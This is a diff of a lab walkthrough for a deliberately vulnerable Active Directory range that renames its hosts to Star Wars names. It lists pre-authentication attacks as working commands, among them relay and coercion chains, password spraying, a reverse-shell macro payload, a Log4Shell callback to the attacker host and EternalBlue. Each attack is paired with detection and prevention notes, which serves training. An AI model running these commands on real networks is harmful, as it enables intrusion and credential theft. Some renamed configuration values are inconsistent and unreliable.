@@ -2,23 +2,23 @@
 
 **You are not domain-joined. You are not running Windows. You are a Kali / BlackArch / Parrot box on the host bridge** (`virbr1`, `10.10.0.1`), staring at `10.10.0.0/21`. No creds, no shells, no agent. This page is everything you can try *before* you have a user-equivalent foothold on the corp.
 
-> The previous version of this lab framed `ws01.corp.local` as the "attacker workstation." That's no longer the case — `ws01` is a domain-joined **victim workstation** (phishing landing, lateral target, credential goldmine). Your tools live on **your own Kali**, not on `ws01`.
+> The previous version of this lab framed `tatooine.empire.local` as the "attacker workstation." That's no longer the case — `tatooine` is a domain-joined **victim workstation** (phishing landing, lateral target, credential goldmine). Your tools live on **your own Kali**, not on `tatooine`.
 
 ```
 ┌─────────────────────────┐                            ┌──────────────────────────────┐
-│   Kali / BlackArch      │   10.10.0.1  ─── virbr1 ─▶ │  corp.local 10.10.0.0/21      │
-│   (your machine)        │                            │  dc01, ca01, file01, sql01,   │
-│   - impacket            │   10.20.0.1  ─── virbr2 ─▶ │  ws01 (victim)                │
+│   Kali / BlackArch      │   10.10.0.1  ─── virbr1 ─▶ │  empire.local 10.10.0.0/21      │
+│   (your machine)        │                            │  coruscant, endor, scarif, kamino,   │
+│   - impacket            │   10.20.0.1  ─── virbr2 ─▶ │  tatooine (victim)                │
 │   - certipy             │                            ├──────────────────────────────┤
-│   - nxc / netexec       │   10.30.0.1  ─── virbr3 ─▶ │  finance.local 10.20.0.0/24   │
+│   - nxc / netexec       │   10.30.0.1  ─── virbr3 ─▶ │  rebel.local 10.20.0.0/24   │
 │   - mitm6 / Responder   │                            ├──────────────────────────────┤
-│   - ntlmrelayx          │                            │  root.corp 10.30.0.0/24       │
+│   - ntlmrelayx          │                            │  trade.corp 10.30.0.0/24       │
 │   - Coercer / PetitPotam│                            └──────────────────────────────┘
 │   - Sliver / Mythic C2  │
 └─────────────────────────┘
 ```
 
-You can run *every tool in the previous walkthroughs from Kali*. WinRM, SMB, LDAP, RPC, Kerberos, ADCS web enrollment, MSSQL, even DCOM are all reachable from a Linux client. The only times you'd want code on a Windows host are: (a) lab `ws01` for OPSEC-realistic mimikatz testing, (b) executing post-exploitation `.exe`s you've already pushed.
+You can run *every tool in the previous walkthroughs from Kali*. WinRM, SMB, LDAP, RPC, Kerberos, ADCS web enrollment, MSSQL, even DCOM are all reachable from a Linux client. The only times you'd want code on a Windows host are: (a) lab `tatooine` for OPSEC-realistic mimikatz testing, (b) executing post-exploitation `.exe`s you've already pushed.
 
 ---
 
@@ -47,14 +47,14 @@ sudo rdate -n 10.10.0.10 || sudo ntpdate 10.10.0.10
 Add a hosts entry so SPN names resolve (Kerberos *requires* hostnames):
 ```bash
 sudo tee -a /etc/hosts <<EOF
-10.10.0.10  dc01.corp.local corp.local
-10.10.0.11  dc01.eu.corp.local eu.corp.local
-10.10.0.12  ca01.corp.local
-10.10.0.13  file01.corp.local
-10.10.0.14  sql01.corp.local
-10.10.0.100 ws01.corp.local
-10.20.0.10  dc01.finance.local finance.local
-10.30.0.10  dc01.root.corp root.corp
+10.10.0.10  coruscant.empire.local empire.local
+10.10.0.11  deathstar.eu.empire.local eu.empire.local
+10.10.0.12  endor.empire.local
+10.10.0.13  scarif.empire.local
+10.10.0.14  kamino.empire.local
+10.10.0.100 tatooine.empire.local
+10.20.0.10  yavin4.rebel.local rebel.local
+10.30.0.10  neimoidia.trade.corp trade.corp
 EOF
 ```
 
@@ -62,26 +62,26 @@ EOF
 ```bash
 sudo tee /etc/krb5.conf <<'EOF'
 [libdefaults]
-    default_realm = CORP.LOCAL
+    default_realm = empire.local
     dns_lookup_realm = true
     dns_lookup_kdc = true
     udp_preference_limit = 0
 
 [realms]
-    CORP.LOCAL = {
-        kdc = dc01.corp.local
-        admin_server = dc01.corp.local
+    empire.local = {
+        kdc = coruscant.empire.local
+        admin_server = coruscant.empire.local
     }
-    EU.CORP.LOCAL    = { kdc = dc01.eu.corp.local }
-    FINANCE.LOCAL    = { kdc = dc01.finance.local }
-    ROOT.CORP        = { kdc = dc01.root.corp }
+    EU.empire.local    = { kdc = deathstar.eu.empire.local }
+    rebel.local    = { kdc = yavin4.rebel.local }
+    trade.corp        = { kdc = neimoidia.trade.corp }
 
 [domain_realm]
-    .corp.local        = CORP.LOCAL
-    corp.local         = CORP.LOCAL
-    .eu.corp.local     = EU.CORP.LOCAL
-    .finance.local     = FINANCE.LOCAL
-    .root.corp         = ROOT.CORP
+    .empire.local        = empire.local
+    empire.local         = empire.local
+    .eu.empire.local     = EU.empire.local
+    .rebel.local     = rebel.local
+    .trade.corp         = trade.corp
 EOF
 ```
 
@@ -95,7 +95,7 @@ Every IA-XYZ writeup below follows the same shape:
 
 ```
 ### IA-XYZ — Title
-What it is | Why it works in DVAD | Tools | Steps | Detection | Prevention
+What it is | Why it works in EMPIRE | Tools | Steps | Detection | Prevention
 ```
 
 The IA series fills the gap between "lab is up" (`01-setup.md`) and "I have a domain user" (`02-recon.md` / `03-credential-access.md`). It is unapologetically pre-auth.
@@ -104,7 +104,7 @@ The IA series fills the gap between "lab is up" (`01-setup.md`) and "I have a do
 
 ### IA-001 — Unauthenticated network sweep (host & service discovery)
 **What it is:** map every host, port, and service on the lab subnets from your Kali. Foundation for everything else.
-**Why it works in DVAD:** no NAC, no host-isolation, no segmentation between attacker bridge and lab.
+**Why it works in EMPIRE:** no NAC, no host-isolation, no segmentation between attacker bridge and lab.
 **Tools:** `nmap`, `masscan`, `rustscan`, `netexec`.
 **Steps:**
 ```bash
@@ -120,7 +120,7 @@ nxc ldap 10.10.0.0/21                           # LDAP availability + naming con
 
 ### IA-002 — Anonymous SMB / null session enumeration
 **What it is:** legacy SMB null bind exposes share lists, password policy, user/group enumeration on older configs.
-**Why it works in DVAD:** Guest enabled, `RestrictAnonymous=0` on some hosts.
+**Why it works in EMPIRE:** Guest enabled, `RestrictAnonymous=0` on some hosts.
 **Tools:** `smbclient`, `enum4linux-ng`, `rpcclient`, `nxc smb -u '' -p ''`.
 **Steps:**
 ```bash
@@ -139,13 +139,13 @@ nxc smb 10.10.0.0/24 -u '' -p '' --shares --users --pass-pol --rid-brute
 
 ### IA-003 — Anonymous LDAP bind
 **What it is:** anonymous LDAP returns the rootDSE and (depending on `dsHeuristics`) parts of the directory tree.
-**Why it works in DVAD:** default `dsHeuristics` allows anonymous rootDSE; `Pre-Windows 2000` group can give broader anon read.
+**Why it works in EMPIRE:** default `dsHeuristics` allows anonymous rootDSE; `Pre-Windows 2000` group can give broader anon read.
 **Tools:** `ldapsearch`, `windapsearch`.
 **Steps:**
 ```bash
 ldapsearch -x -H ldap://10.10.0.10 -b "" -s base "(objectclass=*)"   # rootDSE
-ldapsearch -x -H ldap://10.10.0.10 -b "DC=corp,DC=local" -s sub "(objectclass=user)" sAMAccountName
-windapsearch.py --dc-ip 10.10.0.10 -d corp.local --users
+ldapsearch -x -H ldap://10.10.0.10 -b "DC=empire,DC=local" -s sub "(objectclass=user)" sAMAccountName
+windapsearch.py --dc-ip 10.10.0.10 -d empire.local --users
 ```
 **Detection:** Event `2887` (LDAP anon binds); MDI alert on anonymous queries.
 **Prevention:** `dsHeuristics`: 7th char `2` (no anonymous LDAP). Force LDAP signing.
@@ -154,13 +154,13 @@ windapsearch.py --dc-ip 10.10.0.10 -d corp.local --users
 
 ### IA-004 — DNS recon (zone transfer + brute)
 **What it is:** AD-integrated DNS often allows AXFR or anonymous queries.
-**Why it works in DVAD:** AXFR enabled (REC-007).
+**Why it works in EMPIRE:** AXFR enabled (REC-007).
 **Tools:** `dig`, `dnsenum`, `dnsx`.
 **Steps:**
 ```bash
-dig @10.10.0.10 corp.local AXFR
-dig @10.10.0.10 _ldap._tcp.dc._msdcs.corp.local SRV
-dnsenum --dnsserver 10.10.0.10 corp.local
+dig @10.10.0.10 empire.local AXFR
+dig @10.10.0.10 _ldap._tcp.dc._msdcs.empire.local SRV
+dnsenum --dnsserver 10.10.0.10 empire.local
 ```
 **Detection:** Event `6001` DNS AXFR.
 **Prevention:** restrict zone transfers to named secondaries; disable AXFR.
@@ -169,11 +169,11 @@ dnsenum --dnsserver 10.10.0.10 corp.local
 
 ### IA-005 — Username enumeration via Kerberos
 **What it is:** the KDC returns different error codes for valid vs invalid principals when you request a TGT. Map valid usernames *without* a single failed-logon event on user accounts.
-**Why it works in DVAD:** default Kerberos behaviour, no rate limiting.
+**Why it works in EMPIRE:** default Kerberos behaviour, no rate limiting.
 **Tools:** `kerbrute userenum`.
 **Steps:**
 ```bash
-kerbrute userenum -d corp.local --dc 10.10.0.10 \
+kerbrute userenum -d empire.local --dc 10.10.0.10 \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt
 ```
 **Detection:** Event `4768` with status `0x6` at burst rate; MDI "user enumeration with Kerberos."
@@ -183,12 +183,12 @@ kerbrute userenum -d corp.local --dc 10.10.0.10 \
 
 ### IA-006 — Kerbrute password spray (unauthenticated)
 **What it is:** once you have a username list, spray a common password against the KDC. No NTLM event on the target host, low and slow.
-**Why it works in DVAD:** lockout threshold = 0 (deliberate).
+**Why it works in EMPIRE:** lockout threshold = 0 (deliberate).
 **Tools:** `kerbrute passwordspray`.
 **Steps:**
 ```bash
-kerbrute passwordspray -d corp.local --dc 10.10.0.10 valid_users.txt 'Password123!'
-kerbrute passwordspray -d corp.local --dc 10.10.0.10 valid_users.txt "$(date +Summer%Y)!"
+kerbrute passwordspray -d empire.local --dc 10.10.0.10 valid_users.txt 'SithLord123!'
+kerbrute passwordspray -d empire.local --dc 10.10.0.10 valid_users.txt "$(date +Summer%Y)!"
 ```
 **Detection:** Event `4771` Kerberos pre-auth failed burst; MDI password spray.
 **Prevention:** lockout threshold ≥ 5; smart lockout (Azure AD Password Protection); FIDO2.
@@ -197,11 +197,11 @@ kerbrute passwordspray -d corp.local --dc 10.10.0.10 valid_users.txt "$(date +Su
 
 ### IA-007 — AS-REP roast without credentials
 **What it is:** discover users with `DONT_REQUIRE_PREAUTH` set by trying AS-REQ with no auth — the KDC happily returns the AS-REP, which is crackable.
-**Why it works in DVAD:** `svc_nopreauth` flagged.
+**Why it works in EMPIRE:** `svc_nopreauth` flagged.
 **Tools:** `impacket-GetNPUsers -no-pass`.
 **Steps:**
 ```bash
-impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass \
+impacket-GetNPUsers empire.local/ -dc-ip 10.10.0.10 -no-pass \
    -usersfile valid_users.txt -format hashcat -outputfile asrep.hashes
 hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
 ```
@@ -212,7 +212,7 @@ hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
 
 ### IA-008 — LLMNR / NBT-NS / mDNS poisoning (Responder)
 **What it is:** Windows hosts that fail a DNS lookup broadcast over LLMNR (UDP 5355), NBT-NS (UDP 137), or mDNS (UDP 5353). Answer the broadcast → victim authenticates to you → NTLMv2 hash → crack or relay.
-**Why it works in DVAD:** intentional — LLMNR + NBT-NS left on; no DNS suffix search list.
+**Why it works in EMPIRE:** intentional — LLMNR + NBT-NS left on; no DNS suffix search list.
 **Tools:** `Responder` (Kali default).
 **Steps:**
 ```bash
@@ -228,13 +228,13 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 ### IA-009 — mitm6 (IPv6 stack abuse from external)
 **What it is:** Windows always prefers IPv6 and asks for DHCPv6 on boot. You answer first → become the IPv6 DNS server → serve a `wpad.dat` → every browser uses you as proxy → catch NTLM → relay to LDAPS for delegation/group adds.
-**Why it works in DVAD:** IPv6 enabled, no RA-Guard / DHCPv6-Guard.
+**Why it works in EMPIRE:** IPv6 enabled, no RA-Guard / DHCPv6-Guard.
 **Tools:** `mitm6`, `ntlmrelayx.py`.
 **Steps:**
 ```bash
-sudo mitm6 -i virbr1 -d corp.local --ignore-nofqdn
+sudo mitm6 -i virbr1 -d empire.local --ignore-nofqdn
 # parallel terminal:
-sudo ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh attacker.corp.local \
+sudo ntlmrelayx.py -6 -t ldaps://coruscant.empire.local -wh attacker.empire.local \
    --delegate-access -smb2support
 # wait for a Windows host to ask for DHCPv6 (usually within seconds of any reboot or NIC bounce)
 ```
@@ -260,13 +260,13 @@ sudo nmap -6 -sS -p445,3389,5985 -PS ff02::1%virbr1
 
 ### IA-011 — Unauthenticated MSSQL (SQL Browser + xp_cmdshell)
 **What it is:** SQL Server Browser broadcasts instance metadata on UDP 1434; weak `sa` or sysadmin = `xp_cmdshell` = SYSTEM on the SQL host. Trust links across instances spider the chain.
-**Why it works in DVAD:** SQL Browser on, `sa` enabled, mixed-mode auth.
+**Why it works in EMPIRE:** SQL Browser on, `sa` enabled, mixed-mode auth.
 **Tools:** `nxc mssql`, `impacket-mssqlclient`, `PowerUpSQL`.
 **Steps:**
 ```bash
 nxc mssql 10.10.0.0/24 --gen-relay-list relays.txt
-nxc mssql 10.10.0.14 -u sa -p 'DVADlab2024!' --local-auth -x whoami
-impacket-mssqlclient sa:'DVADlab2024!'@10.10.0.14
+nxc mssql 10.10.0.14 -u sa -p 'EmpireLab2024!' --local-auth -x whoami
+impacket-mssqlclient sa:'EmpireLab2024!'@10.10.0.14
 SQL> EXEC xp_cmdshell 'whoami'
 SQL> EXEC sp_linkedservers
 SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED.SERVER]
@@ -281,8 +281,8 @@ SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED.SERVER]
 **Tools:** `curl`, `Certipy find -scheme http`.
 **Steps:**
 ```bash
-curl -i http://ca01.corp.local/certsrv/
-curl -i http://ca01.corp.local/certsrv/certfnsh.asp
+curl -i http://endor.empire.local/certsrv/
+curl -i http://endor.empire.local/certsrv/certfnsh.asp
 certipy find -u peter.parker -p '<later>' -dc-ip 10.10.0.10 -vulnerable    # post-auth
 ```
 **Detection:** IIS access logs to `/certsrv/`; baseline who hits it.
@@ -291,21 +291,21 @@ certipy find -u peter.parker -p '<later>' -dc-ip 10.10.0.10 -vulnerable    # pos
 ---
 
 ### IA-013 — PetitPotam / DFSCoerce unauthenticated coercion
-**What it is:** **CRITICAL.** `EfsRpcOpenFileRaw` (MS-EFSRPC) over SMB can be triggered by *anonymous* RPC against unpatched Windows. No domain creds needed. Coerce DC$ → relay to ADCS → cert for DC$ → DCSync. This is the single most powerful initial-access primitive in DVAD.
-**Why it works in DVAD:** EFSRPC reachable, no auth on the named pipe, ADCS web HTTP+NTLM, no EPA.
+**What it is:** **CRITICAL.** `EfsRpcOpenFileRaw` (MS-EFSRPC) over SMB can be triggered by *anonymous* RPC against unpatched Windows. No domain creds needed. Coerce DC$ → relay to ADCS → cert for DC$ → DCSync. This is the single most powerful initial-access primitive in EMPIRE.
+**Why it works in EMPIRE:** EFSRPC reachable, no auth on the named pipe, ADCS web HTTP+NTLM, no EPA.
 **Tools:** `PetitPotam.py`, `Coercer`, `ntlmrelayx.py`.
 **Steps:**
 ```bash
 # 1. Relay listener on Kali
-sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
+sudo ntlmrelayx.py -t http://endor.empire.local/certsrv/certfnsh.asp \
    --adcs --template DomainController -smb2support
 
-# 2. Coerce DC01 unauthenticated (no -u/-p)
+# 2. Coerce coruscant unauthenticated (no -u/-p)
 python3 PetitPotam.py -d '' -u '' -p '' 10.10.0.1 10.10.0.10
 # 'unauthenticated' path uses anonymous EFSRPC handle
 ```
 If the box is patched against pre-auth coercion, fall back to authenticated coercion with any low-priv creds (`Coercer.py coerce ...`).
-Outcome: a base64 cert for DC01$. `certipy auth` → TGT → DCSync.
+Outcome: a base64 cert for coruscant$. `certipy auth` → TGT → DCSync.
 
 **Detection:** MDI "PetitPotam coercion"; ADCS Event `4886`/`4887` with cert for DC$ issued to non-DC requester; Sysmon `3` outbound NTLM from DC$.
 **Prevention:** patch ADV210003 + KB5005413; **disable NTLM on ADCS web enrollment, force HTTPS + EPA**; RPC filter for `MS-EFSRPC`.
@@ -326,7 +326,7 @@ python3 Coercer.py coerce -u '' -p '' -t 10.10.0.10 -l 10.10.0.1 --filter-method
 ---
 
 ### IA-015 — ZeroLogon (CVE-2020-1472) pre-auth
-**What it is:** unauthenticated Netlogon attack — set the DC's machine password to empty, then DCSync as `DC01$`. Already documented as DF-035 but listed here because it is *pre-auth* and a true initial-access primitive.
+**What it is:** unauthenticated Netlogon attack — set the DC's machine password to empty, then DCSync as `coruscant$`. Already documented as DF-035 but listed here because it is *pre-auth* and a true initial-access primitive.
 **Tools:** `zerologon_tester.py`, `cve-2020-1472-exploit.py`.
 **Steps:** see DF-035. **Always restore the original DC$ password with `reinstall_original_pw.py` before leaving** — otherwise SYSVOL/AD replication breaks.
 **Detection:** MDI native; Event `5827`.
@@ -341,7 +341,7 @@ python3 Coercer.py coerce -u '' -p '' -t 10.10.0.10 -l 10.10.0.1 --filter-method
 ```bash
 sudo smbserver.py -smb2support share /tmp/dll
 # craft addprinter.dll that runs 'net user evil P@ss /add /domain'
-python3 cve-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 '\\10.10.0.1\share\addprinter.dll'
+python3 cve-2021-1675.py empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 '\\10.10.0.1\share\addprinter.dll'
 ```
 **Detection:** Event `316` PrintService driver-installed; Sysmon `7` DLL load by `spoolsv.exe`.
 **Prevention:** patch; disable Print Spooler on DCs and servers that don't print; `RestrictDriverInstallationToAdministrators=1`.
@@ -349,7 +349,7 @@ python3 cve-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 '\\10
 ---
 
 ### IA-017 — EternalBlue / SMBGhost
-**What it is:** MS17-010 (EternalBlue, SMBv1) and CVE-2020-0796 (SMBGhost, SMBv3 compression). True pre-auth RCE on unpatched Windows. DVAD's base image is patched against these by default, but the Ansible role can re-enable SMBv1 for legacy interop drills.
+**What it is:** MS17-010 (EternalBlue, SMBv1) and CVE-2020-0796 (SMBGhost, SMBv3 compression). True pre-auth RCE on unpatched Windows. EMPIRE's base image is patched against these by default, but the Ansible role can re-enable SMBv1 for legacy interop drills.
 **Tools:** `metasploit ms17_010_eternalblue`, `nmap --script smb-vuln-ms17-010`, `smbghost-poc`.
 **Steps:**
 ```bash
@@ -363,11 +363,11 @@ msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10
 ---
 
 ### IA-018 — Exchange ProxyShell / ProxyNotShell / ProxyLogon (pre-auth chain)
-**What it is:** Exchange OWA/ECP pre-auth RCE chains. Not deployed in default DVAD topology but listed because PLAN.md §12 documents Exchange as an optional add-on.
+**What it is:** Exchange OWA/ECP pre-auth RCE chains. Not deployed in default EMPIRE topology but listed because PLAN.md §12 documents Exchange as an optional add-on.
 **Tools:** `proxyshell.py`, `proxylogon.py`, `Sliver/CS Exchange profile`.
 **Steps (representative):**
 ```bash
-python3 proxyshell.py 10.10.0.50 administrator@corp.local
+python3 proxyshell.py 10.10.0.50 administrator@empire.local
 ```
 **Detection:** IIS log signatures (autodiscover.json with strange chars); Defender for Exchange; MDI.
 **Prevention:** patch Exchange CU; isolate Exchange; certificate-based auth on OWA.
@@ -375,13 +375,13 @@ python3 proxyshell.py 10.10.0.50 administrator@corp.local
 ---
 
 ### IA-019 — Phishing: macro / VBA payload
-**What it is:** classic. `.docm` / `.xlsm` with AutoOpen macro → shell. Delivered via email to a corp user (lab user account on `ws01`). DVAD ships `ws01` with Office disabled by default; install LibreOffice or trigger via `mshta` instead.
+**What it is:** classic. `.docm` / `.xlsm` with AutoOpen macro → shell. Delivered via email to a corp user (lab user account on `tatooine`). EMPIRE ships `tatooine` with Office disabled by default; install LibreOffice or trigger via `mshta` instead.
 **Tools:** `msfvenom`, `macro_pack`, `EvilClippy`, Sliver/Mythic implant generator.
 **Steps:**
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f vba -o macro.vba
 # embed in .docm via macro_pack or manually
-# deliver via fake e-mail / share drop on \\file01\Public
+# deliver via fake e-mail / share drop on \\scarif\Public
 ```
 **Detection:** Office AMSI; Sysmon `1` `winword.exe`→`powershell.exe`/`mshta.exe`/`wmic.exe`; ASR rules.
 **Prevention:** "Block all Office apps from creating child processes" ASR; Mark-of-the-Web on downloads; Application Guard for Office; macros disabled by default (Microsoft post-2022 default).
@@ -389,14 +389,14 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f v
 ---
 
 ### IA-020 — Phishing: LNK / SCF / URL on writable share
-**What it is:** drop `boring-report.lnk` on `\\file01\Public` (Authenticated Users write). The `.lnk`'s `IconLocation` is `\\attacker\share\icon.ico` → any user *who simply opens the folder* triggers an NTLM auth to you. Captures, sometimes relays.
+**What it is:** drop `boring-report.lnk` on `\\scarif\Public` (Authenticated Users write). The `.lnk`'s `IconLocation` is `\\attacker\share\icon.ico` → any user *who simply opens the folder* triggers an NTLM auth to you. Captures, sometimes relays.
 **Tools:** `ntlm_theft.py`, `lnk-template`.
 **Steps:**
 ```bash
 git clone https://github.com/Greenwolf/ntlm_theft
 python3 ntlm_theft.py --generate all --server 10.10.0.1 --greedy
 cp generated/*.lnk /tmp/landing/
-smbclient //10.10.0.13/Public -U 'corp\peter.parker%DVADlab2024!' -c 'put boring-report.lnk'
+smbclient //10.10.0.13/Public -U 'corp\peter.parker%EmpireLab2024!' -c 'put boring-report.lnk'
 sudo responder -I virbr1 -wd
 ```
 **Detection:** Sysmon `11` for `.lnk`/`.url`/`.scf` create; SMB `5145` for share writes; egress UDP 137/445 to attacker IP.
@@ -467,7 +467,7 @@ sudo responder -I virbr1 -wd
 ---
 
 ### IA-025 — VPN / SSL-VPN / Citrix unauthenticated CVEs
-**What it is:** Fortinet (CVE-2022-42475, CVE-2024-21762), Citrix (CVE-2023-3519), Pulse Secure (CVE-2024-21887), Ivanti (CVE-2024-21893). Most engagements *start* here. DVAD doesn't host one by default but the playbook is identical.
+**What it is:** Fortinet (CVE-2022-42475, CVE-2024-21762), Citrix (CVE-2023-3519), Pulse Secure (CVE-2024-21887), Ivanti (CVE-2024-21893). Most engagements *start* here. EMPIRE doesn't host one by default but the playbook is identical.
 **Tools:** CVE-specific PoCs; `nuclei` templates.
 **Detection:** vendor IDS sigs; CVE-specific log signatures.
 **Prevention:** patch — these get a TLP:RED advisory and exploitation within hours.
@@ -480,7 +480,7 @@ sudo responder -I virbr1 -wd
 **Steps (Log4Shell representative):**
 ```bash
 java -jar marshalsec.jar LDAPRefServer "http://10.10.0.1:8888/#Exploit"
-curl 'http://app.corp.local/login?username=${jndi:ldap://10.10.0.1:1389/Exploit}'
+curl 'http://app.empire.local/login?username=${jndi:ldap://10.10.0.1:1389/Exploit}'
 ```
 **Detection:** WAF JNDI signature; outbound LDAP to attacker; Sysmon `3` from Java/IIS worker; Defender for Cloud Apps.
 **Prevention:** patch; egress filtering from app servers; remove serialization gadgets; ASP.NET ViewState MAC mandatory.
@@ -585,7 +585,7 @@ predates that file, re-run Ansible — none of these will work otherwise.
 # Identify SNMP hosts:
 nmap -sU -p161 --open 10.10.0.0/21
 # Walk system tree:
-snmpwalk -v2c -c public 10.10.0.13                          # file01
+snmpwalk -v2c -c public 10.10.0.13                          # scarif
 snmpwalk -v2c -c public 10.10.0.10 1.3.6.1.4.1.77.1.2.25    # SAM/users (LanMan MIB)
 snmpwalk -v2c -c public 10.10.0.13 1.3.6.1.4.1.77.1.2.27    # Shares
 snmpwalk -v2c -c public 10.10.0.13 1.3.6.1.2.1.25.4.2.1.2   # Running processes
@@ -599,9 +599,9 @@ a credential-equivalent into the registry on the entire server fleet.
 
 ---
 
-### IA-035 — Anonymous FTP read on `file01`
+### IA-035 — Anonymous FTP read on `scarif`
 
-IIS `Web-Ftp-Server` is installed on file01. If anonymous is permitted (lab default), you can pull whatever the FTP root exposes.
+IIS `Web-Ftp-Server` is installed on scarif. If anonymous is permitted (lab default), you can pull whatever the FTP root exposes.
 
 ```bash
 ftp 10.10.0.13               # USER anonymous, PASS anything
@@ -614,37 +614,37 @@ wget -r ftp://anonymous:x@10.10.0.13/
 
 ---
 
-### IA-036 — Telnet brute on `file01`
+### IA-036 — Telnet brute on `scarif`
 
-`TlntSvr` runs on file01 (legacy enum practice).
+`TlntSvr` runs on scarif (legacy enum practice).
 
 ```bash
 nmap -p23 --script telnet-encryption,telnet-brute 10.10.0.13
 hydra -L users.txt -P passwords.txt telnet://10.10.0.13 -t4
 ```
-**Detection:** Security 4625 on file01; high TCP/23 connection rate.
+**Detection:** Security 4625 on scarif; high TCP/23 connection rate.
 **Prevention:** Don't ship Telnet. Use SSH.
 
 ---
 
-### IA-037 — Anonymous NFS export read/write on `file01`
+### IA-037 — Anonymous NFS export read/write on `scarif`
 
-`C:\NFSExport` is shared as `DUNDER_NFS` with `EnableAnonymousAccess $true` and `Permission readwrite`. This is the Windows equivalent of `no_root_squash`.
+`C:\NFSExport` is shared as `EMPIRE_NFS` with `EnableAnonymousAccess $true` and `Permission readwrite`. This is the Windows equivalent of `no_root_squash`.
 
 ```bash
 showmount -e 10.10.0.13
-mkdir /mnt/dvad_nfs && sudo mount -t nfs 10.10.0.13:/DUNDER_NFS /mnt/dvad_nfs
-echo 'pwn' > /mnt/dvad_nfs/test.txt
+mkdir /mnt/empire_nfs && sudo mount -t nfs 10.10.0.13:/EMPIRE_NFS /mnt/empire_nfs
+echo 'pwn' > /mnt/empire_nfs/test.txt
 # Plant a malicious LNK or .scf to trigger an NTLM leak when an admin browses
 ```
-**Detection:** NFS log on file01; unfamiliar source IPs reading exports.
+**Detection:** NFS log on scarif; unfamiliar source IPs reading exports.
 **Prevention:** Don't expose Windows NFS to untrusted networks; require kerberos auth.
 
 ---
 
-### IA-038 — SMB1 / EternalBlue on `file01`
+### IA-038 — SMB1 / EternalBlue on `scarif`
 
-SMB1 is enabled **only** on file01 (deliberately gated so the rest of the lab isn't one-shotted). Practise the classic without nuking the lab.
+SMB1 is enabled **only** on scarif (deliberately gated so the rest of the lab isn't one-shotted). Practise the classic without nuking the lab.
 
 ```bash
 nmap -p445 --script smb-protocols 10.10.0.13            # confirm SMB1 advertised
@@ -656,7 +656,7 @@ msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10
 
 ---
 
-### IA-039 — IIS WebDAV PROPFIND + relay endpoint on `ca01`
+### IA-039 — IIS WebDAV PROPFIND + relay endpoint on `endor`
 
 `Web-DAV-Publishing` + `Web-Dir-Browsing` are enabled on the ADCS web server. PROPFIND/OPTIONS responses give you OS / IIS / .NET version + paths; a writable WebDAV path can be used as the HTTP target of an NTLM relay.
 
@@ -679,7 +679,7 @@ Every host now also listens on `5986/tcp` with a self-signed cert. Practice the 
 ```bash
 nmap -p5985,5986 --script ssl-cert 10.10.0.10
 # Self-signed → relay/MITM angle (or just trust-on-first-use):
-evil-winrm -i 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -S
+evil-winrm -i 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -S
 ```
 **Detection:** Cert-pinning telemetry in EDR; unusual 5986 source IPs.
 **Prevention:** Issue WinRM certs from the enterprise CA; pin thumbprints on management hosts.
@@ -688,11 +688,11 @@ evil-winrm -i 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -S
 
 ### IA-041 — DNS AXFR open on every DC
 
-Every DC (not just dc01.corp) now allows zone transfer.
+Every DC (not just coruscant.corp) now allows zone transfer.
 
 ```bash
 for dc in 10.10.0.10 10.10.0.11 10.20.0.10 10.30.0.10; do
-  for z in corp.local eu.corp.local finance.local root.corp; do
+  for z in empire.local eu.empire.local rebel.local trade.corp; do
     dig @$dc $z AXFR +short
   done
 done
@@ -720,29 +720,29 @@ done
 
 ---
 
-### IA-043 — RDP NLA-off (BlueKeep practice gate) on `ws01`
+### IA-043 — RDP NLA-off (BlueKeep practice gate) on `tatooine`
 
-`UserAuthentication=0` on ws01 — connect without NLA, practise CVE-2019-0708 pre-auth path or just brute users without lockout that PreAuth would impose.
+`UserAuthentication=0` on tatooine — connect without NLA, practise CVE-2019-0708 pre-auth path or just brute users without lockout that PreAuth would impose.
 
 ```bash
 nmap -p3389 --script rdp-vuln-ms12-020,rdp-ntlm-info 10.10.0.100
 crowbar -b rdp -s 10.10.0.100/32 -u peter.parker -C passwords.txt
-xfreerdp /v:10.10.0.100 /u:peter.parker /p:'DVADlab2024!' -sec-nla
+xfreerdp /v:10.10.0.100 /u:peter.parker /p:'EmpireLab2024!' -sec-nla
 ```
-**Detection:** 4625 logon type 10 on ws01; RDP brute volume.
+**Detection:** 4625 logon type 10 on tatooine; RDP brute volume.
 **Prevention:** `UserAuthentication=1` (require NLA); MFA via RDPGW.
 
 ---
 
 ### IA-044 — Print Spooler reachable everywhere (PrinterBug from any host)
 
-Spooler is now started on every member, not just `dc01`. A shared printer `DVAD-PRN` is published on `file01`. This means PrinterBug-style coercion (MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx`) works against every domain-joined Windows host in the lab.
+Spooler is now started on every member, not just `coruscant`. A shared printer `EMPIRE-PRN` is published on `scarif`. This means PrinterBug-style coercion (MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx`) works against every domain-joined Windows host in the lab.
 
 ```bash
 # Spool enumeration (anon-bind via lsarpc usually fine):
 impacket-rpcdump '@10.10.0.13' | grep -i spoolss
 # Coerce from non-DC:
-impacket-printerbug 'corp.local/peter.parker:DVADlab2024!@10.10.0.14' 10.10.0.1   # SQL01 coerces to your Kali
+impacket-printerbug 'empire.local/peter.parker:EmpireLab2024!@10.10.0.14' 10.10.0.1   # kamino coerces to your Kali
 # Coerce DC$:
